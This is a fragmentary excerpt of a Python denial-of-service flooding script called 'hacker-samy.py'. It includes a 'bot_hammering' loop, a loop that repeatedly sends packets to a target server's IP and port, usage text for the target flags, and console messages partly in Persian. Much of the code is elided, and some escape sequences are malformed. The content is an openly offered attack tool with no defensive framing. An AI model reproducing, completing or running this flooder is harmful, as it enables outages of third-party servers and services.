...
def bot_hammering(url):
	try:
		while True:
			...
			print("\033[94hacker-samy\033[0m")
			time.sleep(.1)
	except:
		time.sleep(.1)
	...
	try:
		while True:
			...
			if s.sendto( packet, (host, int(port)) ):
				s.shutdown(1)
				print ("\033[92m",time.ctime(time.time()),"\033[0m \033[94m <--Packet sended by hacker-samy iran ---> \033[0m")
			else:
				s.shutdown(1)
				print("\033[91off shod<->down\033[0m")
			time.sleep(.1)
	except socket.error as e:
		print("\033[91mno connection! server maybe down safe jadid baz konid ya dobare emtehan konid\033[0m")
...
def usage():
	...
	https://github.com/Hacker-Samy
	hacker-samy.py  [-s] [-p] [-t]
	-s : server ip 
	-p : port default 80
...
if __name__ == '__main__':
	...
	print("\033[94mPlease wait..iran\033[0m")
	user_agent()
	my_bots()
	time.sleep(5)
	try:
